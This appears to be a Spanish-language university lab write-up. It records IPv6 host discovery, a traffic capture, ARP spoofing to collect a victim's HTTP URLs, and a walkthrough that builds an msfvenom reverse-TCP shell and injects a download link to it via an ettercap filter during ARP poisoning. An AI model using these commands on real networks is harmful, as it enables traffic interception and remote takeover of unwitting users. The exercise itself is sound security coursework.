64 bytes from fe80::250:56ff:fe97:ce93%ens33: icmp_seq=1 ttl=64 time=1.90 ms
64 bytes from fe80::250:56ff:fe97:1158%ens33: icmp_seq=1 ttl=64 time=1.91 ms
64 bytes from fe80::250:56ff:fe97:2c14%ens33: icmp_seq=1 ttl=64 time=1.97 ms
64 bytes from fe80::250:56ff:fe97:555e%ens33: icmp_seq=1 ttl=64 time=2.01 ms
64 bytes from fe80::250:56ff:fe97:d1a4%ens33: icmp_seq=1 ttl=64 time=2.02 ms
64 bytes from fe80::250:56ff:fe97:5236%ens33: icmp_seq=1 ttl=64 time=2.03 ms
64 bytes from fe80::250:56ff:fe97:807f%ens33: icmp_seq=1 ttl=64 time=2.03 ms
64 bytes from fe80::250:56ff:fe97:b20e%ens33: icmp_seq=1 ttl=64 time=2.11 ms
64 bytes from fe80::250:56ff:fe97:fb05%ens33: icmp_seq=1 ttl=64 time=2.11 ms
64 bytes from fe80::250:56ff:fe97:2b61%ens33: icmp_seq=1 ttl=64 time=2.16 ms
64 bytes from fe80::250:56ff:fe97:2ad7%ens33: icmp_seq=1 ttl=64 time=2.17 ms
64 bytes from fe80::250:56ff:fe97:29f0%ens33: icmp_seq=1 ttl=64 time=2.17 ms
64 bytes from fe80::250:56ff:fe97:e8a%ens33: icmp_seq=1 ttl=64 time=2.18 ms
64 bytes from fe80::250:56ff:fe97:c41%ens33: icmp_seq=1 ttl=64 time=2.18 ms
64 bytes from fe80::250:56ff:fe97:6d5c%ens33: icmp_seq=1 ttl=64 time=2.18 ms
64 bytes from fe80::250:56ff:fe97:c22e%ens33: icmp_seq=1 ttl=64 time=2.23 ms
64 bytes from fe80::250:56ff:fe97:9482%ens33: icmp_seq=1 ttl=64 time=2.23 ms
64 bytes from fe80::250:56ff:fe97:b13%ens33: icmp_seq=1 ttl=64 time=2.24 ms
64 bytes from fe80::250:56ff:fe97:ffb9%ens33: icmp_seq=1 ttl=64 time=2.24 ms
64 bytes from fe80::250:56ff:fe97:6605%ens33: icmp_seq=1 ttl=64 time=2.24 ms
64 bytes from fe80::250:56ff:fe97:2119%ens33: icmp_seq=1 ttl=64 time=2.24 ms
64 bytes from fe80::250:56ff:fe97:9515%ens33: icmp_seq=1 ttl=64 time=2.29 ms
64 bytes from fe80::250:56ff:fe97:ee84%ens33: icmp_seq=1 ttl=64 time=2.30 ms
64 bytes from fe80::250:56ff:fe97:6692%ens33: icmp_seq=1 ttl=64 time=2.30 ms
64 bytes from fe80::250:56ff:fe97:3d5b%ens33: icmp_seq=1 ttl=64 time=2.38 ms
64 bytes from fe80::250:56ff:fe97:e2f6%ens33: icmp_seq=1 ttl=64 time=2.38 ms
64 bytes from fe80::250:56ff:fe97:7a37%ens33: icmp_seq=1 ttl=64 time=2.39 ms
64 bytes from fe80::250:56ff:fe97:7bab%ens33: icmp_seq=1 ttl=64 time=2.39 ms
64 bytes from fe80::250:56ff:fe97:343%ens33: icmp_seq=1 ttl=64 time=2.46 ms
64 bytes from fe80::250:56ff:fe97:faf7%ens33: icmp_seq=1 ttl=64 time=2.46 ms
64 bytes from fe80::250:56ff:fe97:6ba6%ens33: icmp_seq=1 ttl=64 time=2.46 ms
64 bytes from fe80::250:56ff:fe97:ded1%ens33: icmp_seq=1 ttl=64 time=2.52 ms
64 bytes from fe80::250:56ff:fe97:2493%ens33: icmp_seq=1 ttl=64 time=2.60 ms
64 bytes from fe80::250:56ff:fe97:c2e4%ens33: icmp_seq=1 ttl=64 time=2.60 ms
64 bytes from fe80::250:56ff:fe97:e534%ens33: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from fe80::250:56ff:fe97:b64a%ens33: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from fe80::250:56ff:fe97:981b%ens33: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from fe80::250:56ff:fe97:89c5%ens33: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from fe80::250:56ff:fe97:24d0%ens33: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from fe80::250:56ff:fe97:c2b1%ens33: icmp_seq=1 ttl=64 time=2.62 ms
64 bytes from fe80::250:56ff:fe97:35b3%ens33: icmp_seq=1 ttl=64 time=2.62 ms
64 bytes from fe80::250:56ff:fe97:d1e1%ens33: icmp_seq=1 ttl=64 time=2.65 ms
64 bytes from fe80::250:56ff:fe97:ac5e%ens33: icmp_seq=1 ttl=64 time=2.66 ms
64 bytes from fe80::250:56ff:fe97:2f8c%ens33: icmp_seq=1 ttl=64 time=2.68 ms
64 bytes from fe80::250:56ff:fe97:be4b%ens33: icmp_seq=1 ttl=64 time=2.68 ms
64 bytes from fe80::250:56ff:fe97:380%ens33: icmp_seq=1 ttl=64 time=2.70 ms
64 bytes from fe80::250:56ff:fe97:6e46%ens33: icmp_seq=1 ttl=64 time=2.72 ms
64 bytes from fe80::250:56ff:fe97:68ea%ens33: icmp_seq=1 ttl=64 time=2.72 ms
64 bytes from fe80::250:56ff:fe97:9b6%ens33: icmp_seq=1 ttl=64 time=2.73 ms
64 bytes from fe80::250:56ff:fe97:3271%ens33: icmp_seq=1 ttl=64 time=2.74 ms
64 bytes from fe80::250:56ff:fe97:a0d5%ens33: icmp_seq=1 ttl=64 time=2.74 ms
64 bytes from fe80::250:56ff:fe97:d0a2%ens33: icmp_seq=1 ttl=64 time=2.74 ms
64 bytes from fe80::250:56ff:fe97:5262%ens33: icmp_seq=1 ttl=64 time=2.74 ms
64 bytes from fe80::250:56ff:fe97:8149%ens33: icmp_seq=1 ttl=64 time=2.74 ms
64 bytes from fe80::250:56ff:fe97:b096%ens33: icmp_seq=1 ttl=64 time=2.79 ms
64 bytes from fe80::250:56ff:fe97:3a4a%ens33: icmp_seq=1 ttl=64 time=2.79 ms
64 bytes from fe80::250:56ff:fe97:aa04%ens33: icmp_seq=1 ttl=64 time=2.80 ms
64 bytes from fe80::250:56ff:fe97:bba5%ens33: icmp_seq=1 ttl=64 time=2.80 ms
64 bytes from fe80::250:56ff:fe97:38f%ens33: icmp_seq=1 ttl=64 time=2.81 ms
64 bytes from fe80::250:56ff:fe97:f213%ens33: icmp_seq=1 ttl=64 time=2.82 ms
64 bytes from fe80::250:56ff:fe97:2a56%ens33: icmp_seq=1 ttl=64 time=2.82 ms
64 bytes from fe80::250:56ff:fe97:51c9%ens33: icmp_seq=1 ttl=64 time=2.86 ms
64 bytes from fe80::250:56ff:fe97:d11d%ens33: icmp_seq=1 ttl=64 time=2.87 ms
64 bytes from fe80::250:56ff:fe97:d15b%ens33: icmp_seq=1 ttl=64 time=2.87 ms
64 bytes from fe80::250:56ff:fe97:2cbf%ens33: icmp_seq=1 ttl=64 time=2.87 ms
64 bytes from fe80::250:56ff:fe97:328a%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:6a6a%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:2cad%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:acf4%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:cdab%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:a04a%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:2598%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:6ae0%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:1b0e%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:acd0%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:86aa%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:775b%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:9ac%ens33: icmp_seq=1 ttl=64 time=2.90 ms
64 bytes from fe80::250:56ff:fe97:4966%ens33: icmp_seq=1 ttl=64 time=2.98 ms
64 bytes from fe80::250:56ff:fe97:a180%ens33: icmp_seq=1 ttl=64 time=2.98 ms
64 bytes from fe80::250:56ff:fe97:b428%ens33: icmp_seq=1 ttl=64 time=3.04 ms
64 bytes from fe80::250:56ff:fe97:f74f%ens33: icmp_seq=1 ttl=64 time=3.04 ms
64 bytes from fe80::250:56ff:fe97:6bbb%ens33: icmp_seq=1 ttl=64 time=3.10 ms
64 bytes from fe80::250:56ff:fe97:d5d9%ens33: icmp_seq=2 ttl=64 time=0.067 ms

--- ff02::1 ping statistics ---
2 packets transmitted, 2 received, +108 duplicates, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 0.067/2.263/3.098/0.648 ms
root@debian:/home/lsi# ip -6 neigh
fe80::250:56ff:fe97:a37c dev ens33 lladdr 00:50:56:97:a3:7c STALE
fe80::250:56ff:fe97:24d0 dev ens33 lladdr 00:50:56:97:24:d0 STALE
fe80::250:56ff:fe97:ee84 dev ens33 lladdr 00:50:56:97:ee:84 STALE
fe80::250:56ff:fe97:9ac dev ens33 lladdr 00:50:56:97:09:ac STALE
fe80::250:56ff:fe97:328a dev ens33 lladdr 00:50:56:97:32:8a STALE
fe80::250:56ff:fe97:e7f9 dev ens33 lladdr 00:50:56:97:e7:f9 STALE
fe80::250:56ff:fe97:981b dev ens33 lladdr 00:50:56:97:98:1b STALE
fe80::250:56ff:fe97:2b61 dev ens33 lladdr 00:50:56:97:2b:61 STALE
fe80::250:56ff:fe97:c15 dev ens33 lladdr 00:50:56:97:0c:15 STALE
fe80::250:56ff:fe97:5236 dev ens33 lladdr 00:50:56:97:52:36 STALE
fe80::250:56ff:fe97:91b6 dev ens33 lladdr 00:50:56:97:91:b6 STALE
fe80::250:56ff:fe97:afa5 dev ens33 lladdr 00:50:56:97:af:a5 STALE
fe80::250:56ff:fe97:b5d6 dev ens33 lladdr 00:50:56:97:b5:d6 STALE
fe80::250:56ff:fe97:c37a dev ens33 lladdr 00:50:56:97:c3:7a STALE
fe80::250:56ff:fe97:4966 dev ens33 lladdr 00:50:56:97:49:66 STALE
fe80::250:56ff:fe97:b20e dev ens33 lladdr 00:50:56:97:b2:0e STALE
fe80::250:56ff:fe97:bba5 dev ens33 lladdr 00:50:56:97:bb:a5 STALE
fe80::250:56ff:fe97:2a56 dev ens33 lladdr 00:50:56:97:2a:56 STALE
fe80::250:56ff:fe97:a104 dev ens33 lladdr 00:50:56:97:a1:04 STALE
fe80::250:56ff:fe97:65d7 dev ens33 lladdr 00:50:56:97:65:d7 STALE
fe80::250:56ff:fe97:7172 dev ens33 lladdr 00:50:56:97:71:72 STALE
fe80::250:56ff:fe97:c2e4 dev ens33 lladdr 00:50:56:97:c2:e4 STALE
fe80::250:56ff:fe97:3499 dev ens33 lladdr 00:50:56:97:34:99 STALE
fe80::250:56ff:fe97:2d96 dev ens33 lladdr 00:50:56:97:2d:96 STALE
fe80::250:56ff:fe97:2598 dev ens33 lladdr 00:50:56:97:25:98 STALE
fe80::250:56ff:fe97:2f8c dev ens33 lladdr 00:50:56:97:2f:8c router STALE
fe80::250:56ff:fe97:51c9 dev ens33 lladdr 00:50:56:97:51:c9 STALE
fe80::250:56ff:fe97:c41 dev ens33 lladdr 00:50:56:97:0c:41 STALE
fe80::250:56ff:fe97:6ba6 dev ens33 lladdr 00:50:56:97:6b:a6 STALE
fe80::250:56ff:fe97:5262 dev ens33 lladdr 00:50:56:97:52:62 STALE
fe80::250:56ff:fe97:fd2c dev ens33 lladdr 00:50:56:97:fd:2c STALE
fe80::250:56ff:fe97:c1b dev ens33 lladdr 00:50:56:97:0c:1b STALE
fe80::250:56ff:fe97:a35f dev ens33 lladdr 00:50:56:97:a3:5f STALE
fe80::250:56ff:fe97:3ef2 dev ens33 lladdr 00:50:56:97:3e:f2 STALE
fe80::250:56ff:fe97:4d2f dev ens33 lladdr 00:50:56:97:4d:2f STALE
fe80::250:56ff:fe97:acd0 dev ens33 lladdr 00:50:56:97:ac:d0 STALE
fe80::250:56ff:fe97:4d09 dev ens33 lladdr 00:50:56:97:4d:09 STALE
fe80::250:56ff:fe97:31fd dev ens33 lladdr 00:50:56:97:31:fd STALE
fe80::250:56ff:fe97:bd3f dev ens33 lladdr 00:50:56:97:bd:3f STALE
fe80::250:56ff:fe97:45e5 dev ens33 lladdr 00:50:56:97:45:e5 STALE
fe80::250:56ff:fe97:60d0 dev ens33 lladdr 00:50:56:97:60:d0 STALE
fe80::250:56ff:fe97:b096 dev ens33 lladdr 00:50:56:97:b0:96 STALE
fe80::250:56ff:fe97:f606 dev ens33 lladdr 00:50:56:97:f6:06 STALE
fe80::250:56ff:fe97:86aa dev ens33 lladdr 00:50:56:97:86:aa STALE
fe80::250:56ff:fe97:1432 dev ens33 lladdr 00:50:56:97:14:32 STALE
fe80::250:56ff:fe97:c4ba dev ens33 lladdr 00:50:56:97:c4:ba STALE
fe80::250:56ff:fe97:c2b1 dev ens33 lladdr 00:50:56:97:c2:b1 STALE
fe80::250:56ff:fe97:4ea5 dev ens33 lladdr 00:50:56:97:4e:a5 STALE
fe80::250:56ff:fe97:ac5e dev ens33 lladdr 00:50:56:97:ac:5e STALE
fe80::250:56ff:fe97:b13 dev ens33 lladdr 00:50:56:97:0b:13 STALE
fe80::250:56ff:fe97:7bab dev ens33 lladdr 00:50:56:97:7b:ab STALE
fe80::250:56ff:fe97:2493 dev ens33 lladdr 00:50:56:97:24:93 STALE
fe80::250:56ff:fe97:32d5 dev ens33 lladdr 00:50:56:97:32:d5 STALE
fe80::250:56ff:fe97:2ad7 dev ens33 lladdr 00:50:56:97:2a:d7 STALE
fe80::250:56ff:fe97:5aa5 dev ens33 lladdr 00:50:56:97:5a:a5 STALE
fe80::250:56ff:fe97:35b3 dev ens33 lladdr 00:50:56:97:35:b3 STALE
fe80::250:56ff:fe97:807f dev ens33 lladdr 00:50:56:97:80:7f router STALE
fe80::250:56ff:fe97:e989 dev ens33 lladdr 00:50:56:97:e9:89 STALE
fe80::250:56ff:fe97:11bc dev ens33 lladdr 00:50:56:97:11:bc STALE
fe80::250:56ff:fe97:38a4 dev ens33 lladdr 00:50:56:97:38:a4 STALE
fe80::250:56ff:fe97:a6a dev ens33 lladdr 00:50:56:97:0a:6a STALE
fe80::250:56ff:fe97:b9f7 dev ens33 lladdr 00:50:56:97:b9:f7 STALE
fe80::250:56ff:fe97:29f2 dev ens33 lladdr 00:50:56:97:29:f2 router STALE
fe80::250:56ff:fe97:8c07 dev ens33 lladdr 00:50:56:97:8c:07 STALE
fe80::250:56ff:fe97:70ac dev ens33 lladdr 00:50:56:97:70:ac STALE
fe80::250:56ff:fe97:987c dev ens33 lladdr 00:50:56:97:98:7c STALE
fe80::250:56ff:fe97:68ea dev ens33 lladdr 00:50:56:97:68:ea STALE
fe80::250:56ff:fe97:6692 dev ens33 lladdr 00:50:56:97:66:92 STALE
fe80::250:56ff:fe97:6ae0 dev ens33 lladdr 00:50:56:97:6a:e0 STALE
fe80::250:56ff:fe97:d1e1 dev ens33 lladdr 00:50:56:97:d1:e1 router STALE
fe80::250:56ff:fe97:ffb9 dev ens33 lladdr 00:50:56:97:ff:b9 STALE
fe80::250:56ff:fe97:114a dev ens33 lladdr 00:50:56:97:11:4a STALE
fe80::250:56ff:fe97:d11d dev ens33 lladdr 00:50:56:97:d1:1d STALE
fe80::250:56ff:fe97:6d5c dev ens33 lladdr 00:50:56:97:6d:5c STALE
fe80::250:56ff:fe97:4965 dev ens33 lladdr 00:50:56:97:49:65 STALE
fe80::250:56ff:fe97:f3e5 dev ens33 lladdr 00:50:56:97:f3:e5 STALE
fe80::250:56ff:fe97:4808 dev ens33 lladdr 00:50:56:97:48:08 STALE
fe80::250:56ff:fe97:380 dev ens33 lladdr 00:50:56:97:03:80 STALE
fe80::250:56ff:fe97:97c0 dev ens33 lladdr 00:50:56:97:97:c0 STALE
fe80::250:56ff:fe97:2cad dev ens33 lladdr 00:50:56:97:2c:ad STALE
fe80::250:56ff:fe97:f213 dev ens33 lladdr 00:50:56:97:f2:13 STALE
fe80::250:56ff:fe97:809b dev ens33 lladdr 00:50:56:97:80:9b STALE
fe80::250:56ff:fe97:8837 dev ens33 lladdr 00:50:56:97:88:37 STALE
fe80::250:56ff:fe97:1562 dev ens33 lladdr 00:50:56:97:15:62 STALE
fe80::250:56ff:fe97:ba37 dev ens33 lladdr 00:50:56:97:ba:37 STALE
fe80::250:56ff:fe97:6bbb dev ens33 lladdr 00:50:56:97:6b:bb STALE
fe80::250:56ff:fe97:ffac dev ens33 lladdr 00:50:56:97:ff:ac STALE
fe80::250:56ff:fe97:fc95 dev ens33 lladdr 00:50:56:97:fc:95 STALE
fe80::250:56ff:fe97:5846 dev ens33 lladdr 00:50:56:97:58:46 STALE
fe80::250:56ff:fe97:3d5b dev ens33 lladdr 00:50:56:97:3d:5b STALE
fe80::250:56ff:fe97:2561 dev ens33 lladdr 00:50:56:97:25:61 STALE
fe80::250:56ff:fe97:e534 dev ens33 lladdr 00:50:56:97:e5:34 STALE
fe80::250:56ff:fe97:2005 dev ens33 lladdr 00:50:56:97:20:05 STALE
fe80::250:56ff:fe97:6d78 dev ens33 lladdr 00:50:56:97:6d:78 STALE
fe80::250:56ff:fe97:8415 dev ens33 lladdr 00:50:56:97:84:15 STALE
fe80::250:56ff:fe97:a04a dev ens33 lladdr 00:50:56:97:a0:4a router STALE
fe80::250:56ff:fe97:169c dev ens33 lladdr 00:50:56:97:16:9c STALE
fe80::250:56ff:fe97:293a dev ens33 lladdr 00:50:56:97:29:3a STALE
fe80::250:56ff:fe97:62b2 dev ens33 lladdr 00:50:56:97:62:b2 STALE
fe80::250:56ff:fe97:f74f dev ens33 lladdr 00:50:56:97:f7:4f STALE
fe80::250:56ff:fe97:a0d5 dev ens33 lladdr 00:50:56:97:a0:d5 STALE
fe80::250:56ff:fe97:1a26 dev ens33 lladdr 00:50:56:97:1a:26 STALE
fe80::250:56ff:fe97:28ca dev ens33 lladdr 00:50:56:97:28:ca router STALE
fe80::250:56ff:fe97:7a37 dev ens33 lladdr 00:50:56:97:7a:37 STALE
fe80::250:56ff:fe97:5993 dev ens33 lladdr 00:50:56:97:59:93 STALE
fe80::250:56ff:fe97:2a5e dev ens33 lladdr 00:50:56:97:2a:5e STALE
fe80::250:56ff:fe97:1b0e dev ens33 lladdr 00:50:56:97:1b:0e STALE
fe80::250:56ff:fe97:b10b dev ens33 lladdr 00:50:56:97:b1:0b STALE
fe80::250:56ff:fe97:2119 dev ens33 lladdr 00:50:56:97:21:19 STALE
fe80::250:56ff:fe97:fbc9 dev ens33 lladdr 00:50:56:97:fb:c9 STALE
fe80::250:56ff:fe97:3a4a dev ens33 lladdr 00:50:56:97:3a:4a STALE
fe80::250:56ff:fe97:53dd dev ens33 lladdr 00:50:56:97:53:dd STALE
fe80::250:56ff:fe97:95ff dev ens33 lladdr 00:50:56:97:95:ff STALE
fe80::250:56ff:fe97:fb05 dev ens33 lladdr 00:50:56:97:fb:05 STALE
fe80::250:56ff:fe97:faf7 dev ens33 lladdr 00:50:56:97:fa:f7 STALE
fe80::250:56ff:fe97:555e dev ens33 lladdr 00:50:56:97:55:5e STALE
fe80::250:56ff:fe97:1b89 dev ens33 lladdr 00:50:56:97:1b:89 STALE
fe80::250:56ff:fe97:38f dev ens33 lladdr 00:50:56:97:03:8f STALE
fe80::250:56ff:fe97:d1a4 dev ens33 lladdr 00:50:56:97:d1:a4 STALE
fe80::250:56ff:fe97:d047 dev ens33 lladdr 00:50:56:97:d0:47 STALE
fe80::250:56ff:fe97:9515 dev ens33 lladdr 00:50:56:97:95:15 STALE
fe80::250:56ff:fe97:2d42 dev ens33 lladdr 00:50:56:97:2d:42 router STALE
fe80::250:56ff:fe97:c22e dev ens33 lladdr 00:50:56:97:c2:2e STALE
fe80::250:56ff:fe97:6a6a dev ens33 lladdr 00:50:56:97:6a:6a STALE
fe80::250:56ff:fe97:5417 dev ens33 lladdr 00:50:56:97:54:17 STALE
fe80::250:56ff:fe97:b428 dev ens33 lladdr 00:50:56:97:b4:28 STALE
fe80::250:56ff:fe97:343 dev ens33 lladdr 00:50:56:97:03:43 STALE
fe80::250:56ff:fe97:4ac1 dev ens33 lladdr 00:50:56:97:4a:c1 STALE
fe80::250:56ff:fe97:babb dev ens33 lladdr 00:50:56:97:ba:bb STALE
fe80::250:56ff:fe97:2cbf dev ens33 lladdr 00:50:56:97:2c:bf STALE
fe80::250:56ff:fe97:45dd dev ens33 lladdr 00:50:56:97:45:dd STALE
fe80::250:56ff:fe97:2c99 dev ens33 lladdr 00:50:56:97:2c:99 STALE
fe80::250:56ff:fe97:3bd6 dev ens33 lladdr 00:50:56:97:3b:d6 STALE
fe80::250:56ff:fe97:6e46 dev ens33 lladdr 00:50:56:97:6e:46 STALE
fe80::250:56ff:fe97:52af dev ens33 lladdr 00:50:56:97:52:af STALE
fe80::250:56ff:fe97:9482 dev ens33 lladdr 00:50:56:97:94:82 STALE
fe80::250:56ff:fe97:d15b dev ens33 lladdr 00:50:56:97:d1:5b STALE
fe80::250:56ff:fe97:cdab dev ens33 lladdr 00:50:56:97:cd:ab router STALE
fe80::250:56ff:fe97:340f dev ens33 lladdr 00:50:56:97:34:0f STALE
fe80::250:56ff:fe97:ce93 dev ens33 lladdr 00:50:56:97:ce:93 STALE
fe80::250:56ff:fe97:b055 dev ens33 lladdr 00:50:56:97:b0:55 STALE
fe80::250:56ff:fe97:fdc8 dev ens33 lladdr 00:50:56:97:fd:c8 STALE
fe80::250:56ff:fe97:b64a dev ens33 lladdr 00:50:56:97:b6:4a STALE
fe80::250:56ff:fe97:1dfd dev ens33 lladdr 00:50:56:97:1d:fd STALE
fe80::250:56ff:fe97:94ab dev ens33 lladdr 00:50:56:97:94:ab STALE
fe80::250:56ff:fe97:acf4 dev ens33 lladdr 00:50:56:97:ac:f4 STALE
fe80::250:56ff:fe97:d67e dev ens33 lladdr 00:50:56:97:d6:7e STALE
fe80::250:56ff:fe97:3b3b dev ens33 lladdr 00:50:56:97:3b:3b STALE
fe80::250:56ff:fe97:8149 dev ens33 lladdr 00:50:56:97:81:49 STALE
fe80::250:56ff:fe97:3026 dev ens33 lladdr 00:50:56:97:30:26 STALE
fe80::250:56ff:fe97:63a dev ens33 lladdr 00:50:56:97:06:3a STALE
fe80::250:56ff:fe97:2c14 dev ens33 lladdr 00:50:56:97:2c:14 STALE
fe80::250:56ff:fe97:41a8 dev ens33 lladdr 00:50:56:97:41:a8 STALE
fe80::250:56ff:fe97:be4b dev ens33 lladdr 00:50:56:97:be:4b STALE
fe80::250:56ff:fe97:9b6 dev ens33 lladdr 00:50:56:97:09:b6 STALE
fe80::250:56ff:fe97:5b23 dev ens33 lladdr 00:50:56:97:5b:23 STALE
fe80::250:56ff:fe97:5f22 dev ens33 lladdr 00:50:56:97:5f:22 STALE
fe80::250:56ff:fe97:71b2 dev ens33 lladdr 00:50:56:97:71:b2 STALE
fe80::250:56ff:fe97:a180 dev ens33 lladdr 00:50:56:97:a1:80 STALE
fe80::250:56ff:fe97:e8a dev ens33 lladdr 00:50:56:97:0e:8a router STALE
fe80::250:56ff:fe97:e2f6 dev ens33 lladdr 00:50:56:97:e2:f6 STALE
fe80::250:56ff:fe97:d0a2 dev ens33 lladdr 00:50:56:97:d0:a2 STALE
fe80::250:56ff:fe97:22 dev ens33 lladdr 00:50:56:97:00:22 STALE
fe80::250:56ff:fe97:aa04 dev ens33 lladdr 00:50:56:97:aa:04 STALE
fe80::250:56ff:fe97:ded1 dev ens33 lladdr 00:50:56:97:de:d1 STALE
fe80::250:56ff:fe97:53d9 dev ens33 lladdr 00:50:56:97:53:d9 STALE
fe80::250:56ff:fe97:259f dev ens33 lladdr 00:50:56:97:25:9f STALE
fe80::250:56ff:fe97:775b dev ens33 lladdr 00:50:56:97:77:5b STALE
fe80::250:56ff:fe97:3271 dev ens33 lladdr 00:50:56:97:32:71 STALE
fe80::250:56ff:fe97:7f95 dev ens33 lladdr 00:50:56:97:7f:95 router STALE
fe80::250:56ff:fe97:8cdc dev ens33 lladdr 00:50:56:97:8c:dc STALE
fe80::250:56ff:fe97:89c5 dev ens33 lladdr 00:50:56:97:89:c5 STALE
fe80::250:56ff:fe97:1158 dev ens33 lladdr 00:50:56:97:11:58 STALE
fe80::250:56ff:fe97:f813 dev ens33 lladdr 00:50:56:97:f8:13 STALE
fe80::250:56ff:fe97:29f0 dev ens33 lladdr 00:50:56:97:29:f0 STALE
fe80::250:56ff:fe97:2798 dev ens33 lladdr 00:50:56:97:27:98 router STALE
fe80::250:56ff:fe97:ee5b dev ens33 lladdr 00:50:56:97:ee:5b STALE
fe80::250:56ff:fe97:6605 dev ens33 lladdr 00:50:56:97:66:05 STALE
```

### Apartado E

Obtenga el tráfico de entrada y salida legítimo de su interface de red `ens33` e investigue los servicios, conexiones y protocolos involucrados.

1. Hacemos un tcpdump para guardar el tráfico capturado en un fichero `my.pcap`:

```bash
root@debian:/home/lsi# tcpdump -i ens33 -s 65535 -w my.pcap
tcpdump: listening on ens33, link-type EN10MB (Ethernet), snapshot length 65535 bytes
^C1250 packets captured
1254 packets received by filter
0 packets dropped by kernel
```

2. Desde nuestra máquina local, hacemos un `scp` para obtener el fichero `my.pcap`:

```zsh
╭─alvarofreire at alvaro-msi in ~ 22-11-03 - 12:44:17
╰─○ scp lsi@10.11.48.50:/home/lsi/my.pcap .
lsi@10.11.48.50's password: 
my.pcap                                    100%  748KB 401.7KB/s   00:01
```

3. Ejecutamos Wireshark y abrimos el archivo `my.pcap` para comenzar a analizar.

### Apartado F

Mediante `arpspoofing` entre una máquina objeto (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.

- Utilizamos el archivo `compa.pcap` obtenido de la máquina de nuestro compañero.

Statistics > HTTP > Requests:

```

================================================================================================================================================
HTTP/Requests:
Topic / Item                     Count         Average       Min Val       Max Val       Rate (ms)     Percent       Burst Rate    Burst Start  
------------------------------------------------------------------------------------------------------------------------------------------------
HTTP Requests by HTTP Host       3                                                       0,0001        100%          0,0100        21,913       
 www.hipertexto.info             2                                                       0,0001        66,67%        0,0100        21,913       
  /documentos/internet_tegn.htm  2                                                       0,0001        100,00%       0,0100        21,913       

------------------------------------------------------------------------------------------------------------------------------------------------
```

### Apartado G

Instale metasploit. Haga un ejecutable que incluya Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.

1. Creamos payload:

```bash
root@debian:/home/lsi# msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.50 LPORT=4444 -f elf > payload.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```

2. Lo metemos en la víctima:

```bash
root@debian:/home/lsi# cat ett.filter 
if (ip.proto == TCP && tcp.src == 80) {
	replace("a href", "a href=\"https://tmpfiles.org/dl/207895/payload.bin\">");
	msg("replaced href.\n");
}

root@debian:/home/lsi# etterfilter ett.filter -o ig.ef

etterfilter 0.8.3.1 copyright 2001-2020 Ettercap Development Team


 14 protocol tables loaded:
	DECODED DATA udp tcp esp gre icmp ipv6 ip arp wifi fddi tr eth 

 13 constants loaded:
	VRRP OSPF GRE UDP TCP ESP ICMP6 ICMP PPTP PPPOE IP6 IP ARP 

 Parsing source file 'ett.filter'  done.

 Unfolding the meta-tree  done.

 Converting labels to real offsets  done.

 Writing output to 'ig.ef'  done.

 -> Script encoded into 6 instructions.
 
 root@debian:/home/lsi# echo 1 > /proc/sys/net/ipv4/ip_forward
 root@debian:/home/lsi# ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.49.106/ //10.11.48.1/

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Content filters loaded from ig.ef...
Listening on:
 ens33 -> 00:50:56:97:D5:D9
	  10.11.48.50/255.255.254.0
	  fe80::250:56ff:fe97:d5d9/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 10.11.49.106 00:50:56:97:24:D0

 GROUP 2 : 10.11.48.1 DC:08:56:10:84:B9
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help

replaced href.

replaced href.

replaced href.

replaced href.

replaced href.

Closing text interface...


Terminating ettercap...
Lua cleanup complete!
ARP poisoner deactivated.
RE-ARPing the victims...
Unified sniffing was stopped.

```

3. Desde el cliente:

```bash
root@debian:/home/lsi# curl http://example.org
<!doctype html>
<html>
<head>
    <title>Example Domain</title>

    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style type="text/css">
    body {
        background-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;

    }
    div {
        width: 600px;
        margin: 5em auto;
        padding: 2em;
        background-color: #fdfdff;
        border-radius: 0.5em;
        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        div {
